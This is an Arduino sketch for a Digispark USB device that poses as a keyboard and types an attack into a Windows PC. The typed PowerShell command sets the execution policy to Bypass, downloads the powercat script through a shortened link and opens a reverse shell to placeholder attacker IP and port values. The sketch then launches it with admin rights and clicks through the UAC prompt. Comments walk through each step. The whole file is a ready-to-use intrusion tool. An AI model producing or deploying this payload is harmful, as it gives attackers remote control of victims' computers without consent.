#include "DigiKeyboard.h"

void setup() {
    /* Open the Windows Run Prompt */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    /* The PowerShell payload first saves the temporary directory in the $a variable and then allows the script to run by setting the Execution Policy to Bypass.
       Afterward, it fetches the powercat.ps1 file from the official Powercat GitHub repository using a web request and finally invokes the import module function.
       Finally the powercat command is executed, specifying the attacker's IP and port. */
    DigiKeyboard.print("powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c <attacker's-ip> -p <attacker's-port> -e powershell");
    /* The Powershell is executed with administrative priviledges. */
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(800);
    /* Bypass the UAC */
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(200);
}

void loop() {
}
